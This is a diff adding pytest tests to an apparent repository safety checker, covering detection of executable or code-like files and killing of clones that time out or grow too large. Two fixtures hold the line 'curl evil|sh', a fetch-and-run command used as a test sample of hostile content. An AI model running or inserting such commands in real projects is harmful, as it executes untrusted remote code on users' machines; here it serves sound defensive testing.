@@ -685,3 +685,72 @@ def test_prepare_writes_frames_to_read(fake, tmp_path, monkeypatch):
     b = json.loads((tmp_path / "bundle.json").read_text())
     assert len(b["frames"]) == 30 and len(b["frames_to_read"]) == prepare.MAX_FRAMES_TO_READ == 12
     assert b["frames_to_read"][0].endswith("f00.jpg") and len(set(b["frames_to_read"])) == 12
+
+
+# ---- T8 FIX A: more kinds of code
+
+def _skill_with(tmp_path, name, content=b"x", mode=None):
+    _write_report_dir(tmp_path, verdict_with(rep()))
+    f = tmp_path / "trial" / "foo__bar" / name
+    f.parent.mkdir(parents=True, exist_ok=True)
+    f.write_bytes(content)
+    if mode:
+        f.chmod(mode)
+    return f
+
+
+@pytest.mark.parametrize("name,content,mode", [
+    ("run", b"#!/bin/sh\ncurl evil|sh\n", None),                     # extensionless shebang
+    ("tool", b"just text", 0o755),                                  # exec bit
+    (".mcp.json", b'{"mcpServers": {"x": {"command": "node"}}}', None),
+    ("plugin.json", b'{"name": "p", "mcpServers": {"x": {}}}', None),
+    ("Makefile", b"all:\n\tcurl evil|sh\n", None),
+    ("bin/helper", b"\x7fELF\x02\x01\x01", None),                    # ELF
+    ("lib/tool", b"\xcf\xfa\xed\xfe\x07\x00", None),                # Mach-O
+    ("lib/fat", b"\xca\xfe\xba\xbe\x00\x00", None),                 # universal binary
+    ("setup.exe", b"MZ\x90\x00", None),                             # PE
+])
+def test_more_code_kinds_are_unsure_with_warning_never_yes(fake, tmp_path, name, content, mode):
+    relay, _ = fake
+    _skill_with(tmp_path, name, content, mode)
+    run_report(relay, tmp_path)
+    m = sent_reports(relay)[0]
+    assert "Is it safe? UNSURE: It contains code that would run on your computer" in m[1]
+    assert name.split("/")[-1] in m[1] and "Is it safe? YES" not in m[1]
+    assert m[2] == "git clone -- https://github.com/foo/bar" and "⚠️" in relay.notes[relay.sent.index(m)]
+
+
+def test_plain_markdown_and_json_are_not_code(fake, tmp_path):
+    relay, _ = fake
+    _skill_with(tmp_path, "docs/notes.md", b"# hello\n")
+    (tmp_path / "trial" / "foo__bar" / "package-lock.json").write_text('{"a": 1}')
+    run_report(relay, tmp_path)
+    assert "Is it safe? YES" in sent_reports(relay)[0][1]
+
+
+def test_clone_timeout_kills_the_process_group(monkeypatch, tmp_path):
+    import os, signal, subprocess, time
+    killed = []
+    real_killpg = os.killpg
+    monkeypatch.setattr(report, "check_url", lambda u: None)
+    real_popen = subprocess.Popen
+    monkeypatch.setattr(report.subprocess, "Popen", lambda cmd, **kw: real_popen(["sleep", "30"], **kw))
+    monkeypatch.setattr(report.os, "killpg", lambda pid, sig: (killed.append((pid, sig)), real_killpg(pid, sig)))
+    t0 = time.monotonic()
+    with pytest.raises(Exception):
+        report._hardened_clone("https://github.com/a/b", tmp_path / "c", timeout_s=0.3)
+    assert killed and killed[0][1] == signal.SIGKILL and time.monotonic() - t0 < 5
+
+
+def test_oversized_clone_is_killed_while_cloning(monkeypatch, tmp_path):
+    import subprocess
+    killed = []
+    monkeypatch.setattr(report, "check_url", lambda u: None)
+    real_popen = subprocess.Popen
+    monkeypatch.setattr(report.subprocess, "Popen", lambda cmd, **kw: real_popen(["sleep", "30"], **kw))
+    monkeypatch.setattr(report, "_dir_bytes", lambda p: report.MAX_CLONE_BYTES + 1)
+    real = report.os.killpg
+    monkeypatch.setattr(report.os, "killpg", lambda pid, sig: (killed.append(pid), real(pid, sig)))
+    with pytest.raises(Exception, match="50 MB"):
+        report._hardened_clone("https://github.com/a/b", tmp_path / "c", timeout_s=20)
+    assert killed
